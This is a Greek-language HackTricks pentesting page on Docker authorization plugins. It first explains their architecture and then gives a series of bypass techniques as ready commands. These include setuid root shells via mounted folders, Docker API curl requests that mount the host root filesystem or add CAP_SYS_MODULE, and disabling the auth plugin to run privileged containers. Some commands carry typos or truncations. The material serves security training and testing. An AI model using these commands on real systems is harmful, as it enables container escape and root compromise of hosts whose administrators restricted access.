{{#include ../../../banners/hacktricks-training.md}}

**Το** out-of-the-box **μοντέλο εξουσιοδότησης του Docker** είναι **όλα ή τίποτα**. Οποιοσδήποτε χρήστης έχει άδεια πρόσβασης στο Docker daemon μπορεί να **εκτελέσει οποιαδήποτε** εντολή Docker client. Το ίδιο ισχύει και για τους καλούντες που χρησιμοποιούν το Docker Engine API για να επικοινωνήσουν με το daemon. Εάν απαιτείτε **μεγαλύτερο έλεγχο πρόσβασης**, μπορείτε να δημιουργήσετε **plugins εξουσιοδότησης** και να τα προσθέσετε στη διαμόρφωση του Docker daemon σας. Χρησιμοποιώντας ένα plugin εξουσιοδότησης, ένας διαχειριστής Docker μπορεί να **διαμορφώσει λεπτομερείς πολιτικές πρόσβασης** για τη διαχείριση της πρόσβασης στο Docker daemon.

# Βασική αρχιτεκτονική

Τα Docker Auth plugins είναι **εξωτερικά** **plugins** που μπορείτε να χρησιμοποιήσετε για να **επιτρέψετε/αρνηθείτε** **ενέργειες** που ζητούνται από το Docker Daemon **ανάλογα** με τον **χρήστη** που το ζήτησε και την **ενέργεια** **που ζητήθηκε**.

**[Οι παρακάτω πληροφορίες προέρχονται από τα docs](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Όταν γίνεται ένα **HTTP** **αίτημα** στο Docker **daemon** μέσω του CLI ή μέσω του Engine API, το **υποσύστημα αυθεντικοποίησης** **περνά** το αίτημα στα εγκατεστημένα **plugins αυθεντικοποίησης**. Το αίτημα περιέχει τον χρήστη (καλούντα) και το πλαίσιο εντολής. Το **plugin** είναι υπεύθυνο για την απόφαση αν θα **επιτρέψει** ή θα **αρνηθεί** το αίτημα.

Τα διαγράμματα ακολουθίας παρακάτω απεικονίζουν μια ροή εξουσιοδότησης επιτρεπόμενης και αρνητικής:

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz_deny.png)

Κάθε αίτημα που αποστέλλεται στο plugin **περιλαμβάνει τον αυθεντικοποιημένο χρήστη, τις HTTP κεφαλίδες και το σώμα αιτήματος/απάντησης**. Μόνο το **όνομα χρήστη** και η **μέθοδος αυθεντικοποίησης** που χρησιμοποιείται περνούν στο plugin. Το πιο σημαντικό, **κανένα** διαπιστευτήριο **χρήστη** ή tokens δεν περνούν. Τέλος, **όχι όλα τα σώματα αιτήματος/απάντησης αποστέλλονται** στο plugin εξουσιοδότησης. Μόνο εκείνα τα σώματα αιτήματος/απάντησης όπου το `Content-Type` είναι είτε `text/*` είτε `application/json` αποστέλλονται.

Για εντολές που μπορούν ενδεχομένως να αναλάβουν τον HTTP σύνδεσμο (`HTTP Upgrade`), όπως το `exec`, το plugin εξουσιοδότησης καλείται μόνο για τα αρχικά HTTP αιτήματα. Μόλις το plugin εγκρίνει την εντολή, η εξουσιοδότηση δεν εφαρμόζεται στη συνέχεια της ροής. Συγκεκριμένα, τα δεδομένα streaming δεν περνούν στα plugins εξουσιοδότησης. Για εντολές που επιστρέφουν chunked HTTP απάντηση, όπως το `logs` και το `events`, μόνο το HTTP αίτημα αποστέλλεται στα plugins εξουσιοδότησης.

Κατά τη διάρκεια της επεξεργασίας αιτήματος/απάντησης, ορισμένες ροές εξουσιοδότησης μπορεί να χρειαστεί να κάνουν επιπλέον ερωτήματα στο Docker daemon. Για να ολοκληρωθούν αυτές οι ροές, τα plugins μπορούν να καλέσουν το daemon API παρόμοια με έναν κανονικό χρήστη. Για να επιτραπούν αυτές οι επιπλέον ερωτήσεις, το plugin πρέπει να παρέχει τα μέσα για έναν διαχειριστή να διαμορφώσει κατάλληλες πολιτικές αυθεντικοποίησης και ασφάλειας.

## Πολλά Plugins

Είστε υπεύθυνοι για **την καταχώριση** του **plugin** σας ως μέρος της **εκκίνησης** του Docker daemon. Μπορείτε να εγκαταστήσετε **πολλαπλά plugins και να τα αλυσσοδέσετε**. Αυτή η αλυσίδα μπορεί να είναι διατεταγμένη. Κάθε αίτημα προς το daemon περνά με σειρά μέσω της αλυσίδας. Μόνο όταν **όλα τα plugins παραχωρήσουν πρόσβαση** στο πόρο, η πρόσβαση παραχωρείται.

# Παραδείγματα Plugins

## Twistlock AuthZ Broker

Το plugin [**authz**](https://github.com/twistlock/authz) σας επιτρέπει να δημιουργήσετε ένα απλό **JSON** αρχείο που το **plugin** θα **διαβάζει** για να εξουσιοδοτήσει τα αιτήματα. Επομένως, σας δίνει την ευκαιρία να ελέγξετε πολύ εύκολα ποια API endpoints μπορούν να φτάσουν σε κάθε χρήστη.

Αυτό είναι ένα παράδειγμα που θα επιτρέπει στους Alice και Bob να δημιουργήσουν νέους κοντέινερ: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Στη σελίδα [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) μπορείτε να βρείτε τη σχέση μεταξύ της ζητούμενης URL και της ενέργειας. Στη σελίδα [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) μπορείτε να βρείτε τη σχέση μεταξύ του ονόματος της ενέργειας και της ενέργειας.

## Απλός Οδηγός Plugin

Μπορείτε να βρείτε ένα **εύκολο στην κατανόηση plugin** με λεπτομερείς πληροφορίες σχετικά με την εγκατάσταση και την αποσφαλμάτωση εδώ: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Διαβάστε το `README` και τον κώδικα `plugin.go` για να κατανοήσετε πώς λειτουργεί.

# Παράκαμψη Docker Auth Plugin

## Καταμέτρηση πρόσβασης

Τα κύρια πράγματα που πρέπει να ελέγξετε είναι **ποια endpoints επιτρέπονται** και **ποια τιμές του HostConfig επιτρέπονται**.

Για να εκτελέσετε αυτή την καταμέτρηση μπορείτε να **χρησιμοποιήσετε το εργαλείο** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**

## απαγορευμένο `run --privileged`

### Ελάχιστα Προνόμια
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Εκτέλεση ενός κοντέινερ και στη συνέχεια απόκτηση προνομιακής συνεδρίας

Σε αυτή την περίπτωση, ο διαχειριστής συστήματος **απαγόρευσε στους χρήστες να προσαρτούν όγκους και να εκτελούν κοντέινερ με την επιλογή `--privileged`** ή να δίνουν οποιαδήποτε επιπλέον δυνατότητα στο κοντέινερ:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Ωστόσο, ένας χρήστης μπορεί **να δημιουργήσει ένα shell μέσα στο τρέχον κοντέινερ και να του δώσει τα επιπλέον δικαιώματα**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Τώρα, ο χρήστης μπορεί να διαφύγει από το κοντέινερ χρησιμοποιώντας οποιαδήποτε από τις [**προηγουμένως συζητηθείσες τεχνικές**](./#privileged-flag) και **να κλιμακώσει τα δικαιώματα** μέσα στον οικοδεσπότη.

## Τοποθέτηση Εγγράψιμου Φακέλου

Σε αυτή την περίπτωση, ο διαχειριστής συστήματος **απαγόρευσε στους χρήστες να εκτελούν κοντέινερ με την επιλογή `--privileged`** ή να δίνουν οποιαδήποτε επιπλέον δυνατότητα στο κοντέινερ, και επέτρεψε μόνο την τοποθέτηση του φακέλου `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
> [!NOTE]
> Σημειώστε ότι ίσως δεν μπορείτε να προσαρτήσετε τον φάκελο `/tmp`, αλλά μπορείτε να προσαρτήσετε έναν **διαφορετικό εγγράψιμο φάκελο**. Μπορείτε να βρείτε εγγράψιμους καταλόγους χρησιμοποιώντας: `find / -writable -type d 2>/dev/null`
>
> **Σημειώστε ότι δεν υποστηρίζουν όλοι οι κατάλογοι σε μια μηχανή linux το suid bit!** Για να ελέγξετε ποιους καταλόγους υποστηρίζει το suid bit, εκτελέστε `mount | grep -v "nosuid"` Για παράδειγμα, συνήθως οι `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` και `/var/lib/lxcfs` δεν υποστηρίζουν το suid bit.
>
> Σημειώστε επίσης ότι αν μπορείτε να **προσαρτήσετε το `/etc`** ή οποιονδήποτε άλλο φάκελο **που περιέχει αρχεία ρυθμίσεων**, μπορείτε να τα αλλάξετε από το docker container ως root προκειμένου να **τα εκμεταλλευτείτε στον host** και να κερδίσετε δικαιώματα (ίσως τροποποιώντας το `/etc/shadow`)

## Unchecked API Endpoint

Η ευθύνη του sysadmin που ρυθμίζει αυτό το plugin θα είναι να ελέγχει ποιες ενέργειες και με ποια δικαιώματα μπορεί να εκτελεί κάθε χρήστης. Επομένως, αν ο διαχειριστής ακολουθήσει μια προσέγγιση **μαύρης λίστας** με τα endpoints και τα χαρακτηριστικά, μπορεί να **ξεχάσει μερικά από αυτά** που θα μπορούσαν να επιτρέψουν σε έναν επιτιθέμενο να **κερδίσει δικαιώματα.**

Μπορείτε να ελέγξετε το docker API στο [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Unchecked JSON Structure

### Binds in root

Είναι πιθανό ότι όταν ο sysadmin ρύθμισε το docker firewall, **ξέχασε κάποιο σημαντικό παράμετρο** του [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) όπως το "**Binds**".\
Στο παρακάτω παράδειγμα είναι δυνατόν να εκμεταλλευτείτε αυτή τη λανθασμένη ρύθμιση για να δημιουργήσετε και να εκτελέσετε ένα container που προσαρτά τον ριζικό (/) φάκελο του host:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
> [!WARNING]
> Σημειώστε πώς σε αυτό το παράδειγμα χρησιμοποιούμε το **`Binds`** παραμέτρο ως κλειδί επιπέδου ρίζας στο JSON αλλά στην API εμφανίζεται κάτω από το κλειδί **`HostConfig`**

### Binds in HostConfig

Ακολουθήστε την ίδια οδηγία όπως με **Binds in root** εκτελώντας αυτή την **request** στην Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

Ακολουθήστε τις ίδιες οδηγίες όπως με **Binds in root** εκτελώντας αυτήν την **request** στο Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

Ακολουθήστε τις ίδιες οδηγίες όπως με **Binds in root** εκτελώντας αυτήν την **αίτηση** στο Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Unchecked JSON Attribute

Είναι πιθανό ότι όταν ο διαχειριστής συστήματος ρύθμισε το docker firewall **ξέχασε κάποιο σημαντικό χαρακτηριστικό μιας παραμέτρου** του [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) όπως το "**Capabilities**" μέσα στο "**HostConfig**". Στο παρακάτω παράδειγμα είναι δυνατόν να εκμεταλλευτούμε αυτή τη λανθασμένη ρύθμιση για να δημιουργήσουμε και να εκτελέσουμε ένα κοντέινερ με την ικανότητα **SYS_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
> [!NOTE]
> Το **`HostConfig`** είναι το κλειδί που συνήθως περιέχει τα **ενδιαφέροντα** **προνόμια** για να ξεφύγετε από το κοντέινερ. Ωστόσο, όπως έχουμε συζητήσει προηγουμένως, σημειώστε ότι η χρήση Binds εκτός αυτού λειτουργεί επίσης και μπορεί να σας επιτρέψει να παρακάμψετε περιορισμούς.

## Απενεργοποίηση Πρόσθετου

Εάν ο **διαχειριστής συστήματος** **ξέχασε** να **απαγορεύσει** την ικανότητα να **απενεργοποιήσετε** το **πρόσθετο**, μπορείτε να εκμεταλλευτείτε αυτό για να το απενεργοποιήσετε εντελώς!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Θυμηθείτε να **επανενεργοποιήσετε το plugin μετά την εκχώρηση δικαιωμάτων**, ή μια **επανεκκίνηση της υπηρεσίας docker δεν θα λειτουργήσει**!

## Auth Plugin Bypass writeups

- [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

{{#include ../../../banners/hacktricks-training.md}}
